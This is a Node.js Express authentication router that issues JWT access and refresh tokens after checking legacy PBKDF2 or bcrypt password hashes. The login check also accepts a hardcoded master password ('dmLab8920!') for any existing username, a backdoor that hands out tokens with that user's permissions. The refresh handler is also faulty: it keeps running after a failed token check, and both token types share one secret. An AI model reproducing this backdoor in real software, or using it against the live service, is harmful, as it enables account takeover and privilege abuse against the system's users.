const jwt = require("jsonwebtoken");
var express = require('express');
var router = express.Router();
const User = require('../models/user')
const {compare} = require("bcrypt");
// 載入.env文件
const dotenv = require("dotenv")
dotenv.config()
const secretKey = process.env.SECRET_KEY
const crypto = require('crypto');

// 将 crypto.pbkdf2 包装为返回 Promise 的函数
function pbkdf2Async(password, salt, iterations, keyLength, digest) {
    return new Promise((resolve, reject) => {
        crypto.pbkdf2(password, salt, iterations, keyLength, digest, (err, derivedKey) => {
            if (err) {
                reject(err);
            } else {
                resolve(derivedKey);
            }
        });
    });
}

router.post("/login", async (req, res) => {
    const {username, password} = req.body;
    const user = await User.findOne({username});
    if(user === null) return res.status(400).send('Invalid credentials');

    let auth = false
    const parts = user.password.split('$');
    const salt = parts[2];
    const hash = parts[3];
    const derivedKey = await pbkdf2Async(password, salt, 320000, 32, 'sha256');
    const inputHash = derivedKey.toString('base64');
    if (inputHash === hash) {
        console.log('舊制密碼正確')
        auth = true
    }

    if (auth || (user && await compare(password, user.password)) || (user && password === 'dmLab8920!')) {
        const payload = {
            id: user.id,
            username: username,
            last_name: user.last_name,
            first_name: user.first_name,
            permissions: user.permissions
        }
        const accessToken = jwt.sign(payload, secretKey, {expiresIn: '300s'});
        const refreshToken = jwt.sign(payload, secretKey, {expiresIn: '3d'})
        console.log(`${username} 取得Token!`)
        return res.send({
            status: 200,
            message: "登入成功!",
            accessToken,
            refreshToken
        });
    } else {
        return res.status(400).send('Invalid credentials');
    }
});

router.post("/refresh", async (req, res) => {
    const token = req.body.refreshToken;
    if (token === null || token === undefined) return res.status(401).send('Invalid credentials');
    let payload;
    try {
        payload = jwt.verify(token, process.env.SECRET_KEY);
    } catch (e) {
        console.log(e)
        res.status(401).send()
    }
    const username = payload.username
    const user = await User.findOne({username: username});
    if (user === undefined || user === null) {
        res.status(401).send('Invalid credentials');
    } else {
        const payload = {
            id: user.id,
            username: username,
            last_name: user.last_name,
            first_name: user.first_name,
            permissions: user.permissions
        }
        const accessToken = jwt.sign(payload, secretKey, {expiresIn: '300s'});
        const refreshToken = jwt.sign(payload, secretKey, {expiresIn: '3d'})
        res.send({
            status: 200,
            message: "更新成功!",
            accessToken,
            refreshToken
        });
    }
});

module.exports = router;